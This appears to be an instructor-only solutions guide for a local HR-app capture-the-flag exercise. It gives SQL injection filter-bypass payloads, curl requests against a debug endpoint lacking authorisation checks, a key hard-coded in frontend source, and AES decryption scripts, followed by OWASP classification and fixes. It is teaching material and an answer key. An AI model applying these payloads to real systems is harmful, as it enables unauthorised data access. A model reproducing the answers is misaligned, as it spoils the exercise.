# CTF 3 -- Solutions

> **Instructors/markers only.** Do not distribute to participants.

---

## Credentials

- See `credentials.json` for generated per-user passwords.
- Usernames follow the `abcd12` format (4 letters + 2 digits).
- Generate credentials with: `cd CTFs/challenge-generation && node chgen_ctf3.js abcd12 efgh34`

---

## Flag Location

Each user has two types of flags stored in `flags.json`:
- `flag_api` -- returned by the `/api/flag` endpoint and shown on the `/flag` page
- `flag_decrypt` -- encrypted with AES-256-CBC, placed in the user's bot employee notes

Flag format: `durham-hr{<token>_<username>}`

---

## Overview

The HR System CTF includes:

- A login page (`/login`)
- A dashboard and employee directory
- A hidden `/flag` page (discoverable via path traversal hint)
- A debug API endpoint that leaks credentials
- Per-user bot employees with encrypted flag notes (discoverable via SQL injection)

To solve the CTF, students exploit multiple vulnerabilities to collect 3 per-user flags.

---

## Flag 1: Path Traversal (Per-User)

### Steps

1. Login at http://localhost:5174 with credentials from `credentials.json`
2. Inspect Dashboard page source (Ctrl+U or View Source)
3. Find HTML comment: `<!-- TODO: Fix broken admin link - /admin/../../flag should redirect properly -->`
4. Navigate to: `http://localhost:5174/flag`
5. The page fetches the flag from the backend API `/api/flag` using the player's JWT

**Flag:** `durham-hr{..._<username>}` (per-user, from `flags.json` `flag_api`)

---

## Flag 2: SQL Injection + Source Code Key + Decryption (Per-User)

This flag requires chaining three vulnerabilities together.

### Step 1: Discover the encryption key

1. Open DevTools (F12) -> Sources tab
2. Navigate to: `src/utils/legacyAuth.ts`
3. Find key in comments: `CTF_2026_SECRET_KEY_XJ9K2L`

### Step 2: SQL injection to find hidden bot employee

The employee search filters basic injection like `' OR 1=1--` but misses no-space variants.

**Blocked:** `' OR 1=1--` (space after quote)

**Working Payloads:**
- `'OR 1=1--` (no space after quote)
- `'/**/OR/**/1=1--` (comment-based)

1. Go to Employees page
2. Enter payload in search: `'OR 1=1--`
3. Returns all employees including the hidden bot employees (e.g., `BOT001`):

```json
{
  "employee_id": "BOT001",
  "notes": "AES-256-CBC encrypted data: <iv>:<ciphertext> (hint: check legacy code for the key)"
}
```

Each player has their own bot employee (`<username>-bot`) with their own encrypted flag.

### Step 3: Get encrypted data via debug endpoint

**Hint in:** `frontend/src/api/client.ts` shows debug endpoint

```bash
# Get token
TOKEN=$(curl -s -X POST http://127.0.0.1:8004/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"abcd12","password":"<password>"}' \
  | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

# Query debug endpoint for your bot
curl "http://127.0.0.1:8004/api/debug/config?user=abcd12-bot" \
  -H "Authorization: Bearer $TOKEN"
```

**Response:**
```json
{
  "user": "abcd12-bot",
  "config": {
    "notes": "AES-256-CBC encrypted data: <iv>:<ciphertext> (hint: check legacy code for the key)",
    "owner": "abcd12"
  }
}
```

### Step 4: Decrypt the flag

**Node.js:**
```javascript
const crypto = require('crypto');

const encrypted = '<iv_base64>:<ciphertext_base64>';  // from bot notes
const key_passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L';

const [ivBase64, ciphertext] = encrypted.split(':');
const key = crypto.createHash('sha256').update(key_passphrase).digest();
const iv = Buffer.from(ivBase64, 'base64');
const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);

let decrypted = decipher.update(ciphertext, 'base64', 'utf8');
decrypted += decipher.final('utf8');
console.log(decrypted);
```

**Python:**
```python
from Crypto.Cipher import AES
import hashlib, base64

encrypted = '<iv_base64>:<ciphertext_base64>'  # from bot notes
key_passphrase = 'CTF_2026_SECRET_KEY_XJ9K2L'

iv_b64, ciphertext = encrypted.split(':')
key = hashlib.sha256(key_passphrase.encode()).digest()
iv = base64.b64decode(iv_b64)
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(base64.b64decode(ciphertext))

# Remove PKCS7 padding
pad_len = decrypted[-1]
decrypted = decrypted[:-pad_len].decode('utf-8')
print(decrypted)
```

**Flag:** `durham-hr{..._<username>}` (per-user, from `flags.json` `flag_decrypt`)

---

## Flag 3: API Flag Endpoint (Per-User)

```bash
curl "http://127.0.0.1:8004/api/flag" \
  -H "Authorization: Bearer $TOKEN"
```

**Response:**
```json
{
  "flag": "durham-hr{..._<username>}"
}
```

**Flag:** Same as Flag 1 (`flag_api` value from `flags.json`)

---

## Vulnerabilities Exploited

| Vulnerability | Location | Description |
|---------------|----------|-------------|
| Path traversal hint | Dashboard HTML source | Comment reveals hidden `/flag` route |
| Information disclosure | `legacyAuth.ts` | Encryption key in frontend source code |
| SQL injection | `EmployeeController::index()` | Bypassable filter using no-space technique |
| Debug API leak | `DebugController::getUserConfig()` | Returns raw credentials without proper authorization |
| Insecure encryption | Bot employee notes | AES-256-CBC with key discoverable in source |

---

## Reset

```bash
docker compose down -v && docker compose up --build
```

This re-runs migrations and re-seeds from the mounted `flags.json` and `credentials.json`.

---

## Post-Design Audit

### Vulnerability Summary

- **Flag 1 — `flag_api` (path-traversal hint → JWT-authenticated `/api/flag`).** The dashboard view embeds an HTML comment containing the literal string `/admin/../../flag`, which functions as a discoverability hint rather than a real traversal vulnerability. Once the player navigates to `/flag`, the page calls `GET /api/flag` with the player's session JWT; the controller in `backend/app/Http/Controllers/FlagController.php` looks up the authenticated user's `flag_api` value from the `flags` table seeded from `flags.json`. The vulnerability is **information disclosure via dev-comment leakage**, not actual filesystem traversal.
- **Flag 2 — `flag_decrypt` (SQL injection → encrypted blob → key-in-source decrypt).** Three chained primitives:
  1. **SQL injection** in `EmployeeController::index()` (`backend/app/Http/Controllers/EmployeeController.php`). The search filter blocks the canonical `' OR 1=1--` payload but misses the no-space variant `'OR 1=1--` and `'/**/OR/**/1=1--`, both of which return all rows including the per-player `<username>-bot` employee whose `notes` column carries an AES-256-CBC ciphertext.
  2. **Plaintext encryption key in frontend source.** `frontend/src/utils/legacyAuth.ts` hard-codes `CTF_2026_SECRET_KEY_XJ9K2L` in a comment that ships in the bundled JS — visible in DevTools → Sources.
  3. **Authorisation bypass on debug endpoint.** `DebugController::getUserConfig()` returns the encrypted blob (and other config) keyed on a `user` query parameter without checking that the requester owns the resource — an IDOR. With the SQLi already done, this is the cheaper retrieval path.

### OWASP Top 10 Classification

| Flag | OWASP 2021 | CWE | One-line justification |
|------|-----------|-----|------------------------|
| 1 | A04 — Insecure Design | CWE-540 | Comment in dashboard HTML leaks the existence and shape of the `/flag` endpoint. |
| 2 | A03 — Injection | CWE-89 | Filter-based SQLi mitigation in `EmployeeController::index()` is bypassable by whitespace-free / comment-padded payloads. |
| 2 | A02 — Cryptographic Failures | CWE-798 | AES-256-CBC key shipped in browser-visible TypeScript source. |
| 2 | A01 — Broken Access Control | CWE-639 | `DebugController::getUserConfig()` returns arbitrary users' configs without authorisation checks. |

### Defence Recommendations

- **Flag 1 fix.** Remove the dev comment from `dashboard.blade.php` (or its frontend analogue). Authorise `/api/flag` not just by JWT presence but by an explicit role/claim — the current setup releases per-user flags to any authenticated player, which is acceptable as a teaching primitive but unacceptable in production.
- **Flag 2 fix — SQLi.** Replace the regex/string-filter approach in `EmployeeController::index()` with parameterised Eloquent queries: `Employee::where('name', 'like', '%' . $search . '%')`. Drop the filter entirely; binding is sufficient.
- **Flag 2 fix — key disclosure.** Move the AES key into a server-only environment variable (`config/encryption.php`) and have the backend perform decryption, returning plaintext (or blocked) to the frontend. Never ship encryption keys to a browser-visible asset.
- **Flag 2 fix — debug endpoint.** Either remove `DebugController::getUserConfig()` outside development environments (`if (app()->environment('local'))` guard) or require the requesting user to match the queried user.

### Unintended Solutions to Watch For

- **Direct AES decryption against the JSON in `flags.json` on the host.** A player with shell access to the dev's machine can read `flag_decrypt` directly. Out of scope — the test harness in `e2e/ctf3_exploit.py` runs against the running container and never reads the host file.
- **Skipping SQLi by guessing the bot username.** The `<username>-bot` naming convention is documented in scaffolding text on the Employees page; a player who guesses the structure can hit `DebugController::getUserConfig()` directly without the SQLi step. Accepted — same OWASP class (A01), and the e2e test only asserts flag retrieval, not the path taken.
- **Brute-forcing the AES key.** `CTF_2026_SECRET_KEY_XJ9K2L` derives a 256-bit key via SHA-256, which is not brute-forceable. Players who skip Step 1 get stuck and re-read the source. Acceptable friction.

### Skill Level & Realism Notes

- Target skill level: **intermediate → advanced**. Chains three vulnerabilities of different classes (info disclosure, injection, IDOR + crypto). Players need familiarity with browser dev tools, SQL injection technique, and command-line crypto.
- Real-world analogue: enterprise HR/CRM apps where a debug endpoint survives into production (CVE-2023-29489 cPanel debug, plus countless internal post-mortems). The frontend-source key leak mirrors several mobile-app reverse-engineering write-ups (e.g. Strava, Tinder embedded API keys). SQL filter bypass via no-space variants is a documented WAF/regex evasion class.

### Lessons Learned (Design Retrospective)

- **Two flags per user changed the contract-test shape.** `flags.json` evolved from `{username: flag}` (CTF1 shape) to `{username: {flag_api, flag_decrypt}}`. The contract test in `backend/tests/Feature/ContractTest.php` now needs to assert both fields exist for every seeded user; the seeder behaviour must be deterministic in test mode.
- **No-space SQLi was nearly missed.** During development the filter was tested against `' OR 1=1--` only; the bypass was discovered when a tester ran `sqlmap` and reported the no-space variant. Lesson: never rely on string filters for SQLi defence; always parameterise. The CTF intentionally retains the broken filter as the teaching primitive.
- **Frontend source as a leakage surface is under-appreciated.** Players consistently miss `legacyAuth.ts` on first attempt; adding an HTML hint pointing at `Sources` was considered but rejected — the discoverability gap matches real-world reality where bundled JS is rarely audited.
- **Next time:** add an integration test that asserts the encrypted `notes` column in the seeded DB decrypts back to the per-user `flag_decrypt` value — this would catch any regression in the seeder's encryption logic without needing the full e2e chain. Maps directly into Phase 2's CTF3 integration brief.
